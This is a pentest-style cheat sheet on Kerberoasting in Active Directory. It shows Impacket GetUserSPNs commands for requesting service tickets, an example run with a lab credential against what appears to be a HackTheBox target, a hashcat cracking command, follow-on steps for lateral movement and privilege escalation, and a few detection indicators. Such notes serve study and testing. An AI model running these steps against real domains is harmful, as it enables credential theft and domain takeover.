
# Kerberoasting

## TAGS

kerberoast, kerberos, active-directory, credential-access, privilege-escalation, impacket

---

## 📌 Overview

Kerberoasting is an Active Directory attack technique where a valid domain user requests a Kerberos service ticket (TGS) for an account with a Service Principal Name (SPN) set.

Because the TGS is encrypted with the target service account’s password hash, it can be extracted and cracked offline. If the password is weak, this can lead to privilege escalation or full domain compromise.

---

## 🔍 When to Use

IF:

* You have valid domain credentials
* The target is part of Active Directory
* One or more user accounts have SPNs configured

THEN:
→ Enumerate SPNs and attempt Kerberoasting

---

## ✅ Requirements

* Valid domain credentials
* Network access to the domain controller
* A tool capable of requesting SPNs / TGS tickets

---

## ⚙️ Enumeration

### 1. Identify SPN Accounts

```bash
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <target>
```

Example:

```bash
GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.129.19.56
```

---

## 🎯 Exploitation

### 2. Request TGS Tickets

```bash
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <target> -request
```

Example:

```bash
GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.129.19.56 -request
```

This returns one or more Kerberos TGS hashes for offline cracking.

---

## 🔓 Cracking

### 3. Save Hash to File

Save the returned hash into a file, for example:

```text
kerberoast.hash
```

---

### 4. Crack with Hashcat

```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force
```

---

## 📤 Expected Result

```text
service_account_or_target_user : plaintext_password
```

---

## 🚀 Next Steps

After recovering credentials:

* Re-enumerate SMB shares
* Attempt WMI / WinRM / PSExec / RDP
* Check group membership and privileges
* Pivot further inside the domain
* Look for Domain Admin or delegated admin rights

---

## ⚠️ Detection Opportunities

* Unusual TGS requests for service accounts
* High-volume Kerberos ticket requests from non-admin workstations
* Event ID 4769 spikes
* Requests for uncommon SPNs outside normal service behavior

---

## 🧠 Notes

* Kerberoasting requires only a normal domain user in many cases
* Weak service account passwords make this highly effective
* Service accounts are often overprivileged
* This is commonly chained after:

  * SMB credential exposure
  * GPP credential recovery
  * Password spraying
  * AS-REP roasting of other accounts

---

## 🔗 Common Follow-On Patterns

* GPP credential extraction
* SMB authenticated enumeration
* WMI execution
* Pass-the-Hash
* BloodHound path analysis

---
